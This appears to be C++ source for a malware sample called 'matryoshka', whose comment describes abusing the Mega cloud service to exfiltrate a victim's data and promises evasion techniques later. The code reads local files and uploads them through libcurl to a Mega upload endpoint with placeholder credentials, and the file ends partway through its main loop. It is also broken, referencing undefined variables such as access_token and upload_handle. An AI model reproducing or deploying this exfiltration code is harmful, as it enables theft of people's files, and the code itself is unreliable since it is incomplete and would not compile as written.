/* 
Sometimes we see malware exploiting Telegram or Discord to exploit a goal for which it was programmed, and in this simulation it exploited Maga to dump data by giving the malware some data that it might use to lift data through it and it was written in C++ for ease, I added evasion techniques in the future, if you need this
 -------------------------------
| Author : S3N4T0R               |
| Name : matryoshka              |
| Date : june 4 2022             |
 --------------------------------
*/

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdlib>
#include <curl/curl.h>

// Define the email and password for the Mega account
const std::string MEGA_EMAIL = "email.com";
const std::string MEGA_PASSWORD = "password";

// Define the URL to the Mega API for uploading files
const std::string MEGA_UPLOAD_URL = "mega upload url";

static size_t write_callback(char* ptr, size_t size, size_t nmemb, void* userdata) {
    std::string* response = reinterpret_cast<std::string*>(userdata);
    response->append(ptr, size * nmemb);
    return size * nmemb;
}

bool upload_file_to_mega(const std::string& filepath) {
    // Open the file for reading
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "Error: failed to open file " << filepath << std::endl;
        return false;
    }

    std::vector<char> filedata((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "Error: failed to initialize CURL" << std::endl;
        return false;
    }

    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");
    headers = curl_slist_append(headers, ("Authorization: MegaApiBearer " + access_token).c_str());
    headers = curl_slist_append(headers, ("Upload-Handle: " + upload_handle).c_str());
    curl_easy_setopt(curl, CURLOPT_URL, MEGA_UPLOAD_URL.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, filedata.data());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, filedata.size());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);

    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {
        std::cerr << "Error: CURL request failed with error code " << res << std::endl;
        return false;
    }

   
    return true;
}

int main() {
    std::vector<std::pair<std::string, std::string>> files = {
        {"file1.txt", "txt"},
        {"file2.png", "png"},
        {"file3.pdf", "pdf"}
    };

 

    for (const auto& file : files) {
        std::string filepath = file.first;
        std::string fileformat = file.second;

      

